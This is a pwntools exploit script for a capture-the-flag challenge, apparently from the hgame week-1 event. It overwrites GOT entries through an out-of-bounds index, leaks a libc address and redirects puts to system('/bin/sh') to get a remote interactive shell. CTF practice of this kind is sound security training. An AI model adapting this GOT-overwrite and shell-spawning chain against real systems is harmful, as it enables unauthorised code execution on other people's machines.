from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln"])
sh = remote("week-1.hgame.lwsec.cn", 30568)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")

vuln_addr = elf.sym['vuln']
exit_got = elf.got['exit']
printf_got = elf.got['printf']
puts_got = elf.got['puts']
seat_addr = 0x4040A0

def get_idx(addr: int) -> int:
    return ((addr&0xfffff0) - seat_addr)//16

def set_message(addr: int, msg: bytes):
    sh.sendlineafter(b"Here is the seat from 0 to 9, please choose one.", str(get_idx(addr)).encode())
    sh.sendafter(b"please input your name", msg)

set_message(exit_got, p64(vuln_addr) + p64(0))
set_message(printf_got, b'A'*0x08 + p64(0x401050))
sh.recvuntil(b"A"*8)

libc_base = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x61c90
system_addr = libc_base + libc.sym['system']
print("libc_base:", hex(libc_base))

set_message(puts_got-0x08, b'/bin/sh\x00'.ljust(8, b'\x00') + p64(system_addr))

sh.interactive()